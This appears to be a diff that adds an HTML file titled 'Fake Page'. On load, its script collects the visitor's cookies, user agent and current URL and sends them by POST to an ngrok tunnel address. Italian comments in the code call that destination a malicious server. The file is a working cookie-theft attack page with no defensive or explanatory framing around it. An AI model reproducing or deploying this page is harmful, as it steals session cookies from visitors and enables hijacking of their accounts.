@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fake Page</title>
+</head>
+<body>
+    <h1>Welcome to the fake page!</h1>
+    <script>
+        // Funzione per inviare i dati al server
+        function sendData(data) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://d8e2-213-45-241-111.ngrok-free.app", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send(data);
+        }
+
+        // Colleziona i cookie e altre informazioni
+        var cookies = document.cookie;
+        var userAgent = navigator.userAgent;
+        var currentURL = window.location.href;
+
+        // Componi i dati da inviare
+        var data = "cookies=" + encodeURIComponent(cookies) + 
+                   "&userAgent=" + encodeURIComponent(userAgent) +
+                   "&currentURL=" + encodeURIComponent(currentURL);
+
+        // Invia i dati al server malevolo
+        sendData(data);
+    </script>
+</body>
+</html>
